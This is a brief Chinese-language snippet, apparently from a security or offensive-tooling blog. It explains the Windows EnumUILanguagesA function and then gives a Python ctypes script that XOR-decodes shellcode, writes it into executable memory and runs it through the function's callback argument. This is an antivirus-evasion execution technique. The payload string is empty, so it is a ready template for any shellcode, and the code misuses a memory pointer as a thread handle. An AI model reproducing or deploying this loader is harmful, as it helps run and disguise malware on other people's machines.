EnumUILanguages 函数枚举系统上可用的 UI 语言。

BOOL EnumUILanguagesA(
  UILANGUAGE_ENUMPROC pUILangEnumProc, // 回调函数
  DWORD dwFlags,                       // 保留值，必须为0
  LONG_PTR lParam                      // 回调函数的传参位置，没有即为0
);
以EnumUILanguagesA调用shellcode
# -*- coding: utf-8 -*-
# @Time : 2022-01-19 22:12
# @Author : ILU
# @File : EnumUILanguagesA.py

import ctypes

sc = b''.decode()
key = 50
buf = [ord(sc[i]) ^ key for i in range(len(sc))]
buf = bytearray(buf)
kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(buf)),
    ctypes.c_int(0x00001000),  # #define MEM_COMMIT  0x00001000
    ctypes.c_int(0x40)  # #define PAGE_EXECUTE_READWRITE  0x40
)
buffer = (ctypes.c_char * len(buf)).from_buffer(buf)
kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffer,
    ctypes.c_int(len(buf))
)
kernel32.EnumUILanguagesA(ctypes.c_char_p(ptr), ctypes.c_int16(0), ctypes.c_int16(0))
# 等待运行的线程关闭再关闭程序，-1为INFINITE无限等待的意思
# 第一个参数：线程句柄
# 第二个参数: d
kernel32.WaitForSingleObject(ctypes.c_uint64(ptr), ctypes.c_int(-1))
kernel32.CloseHandle(ptr)
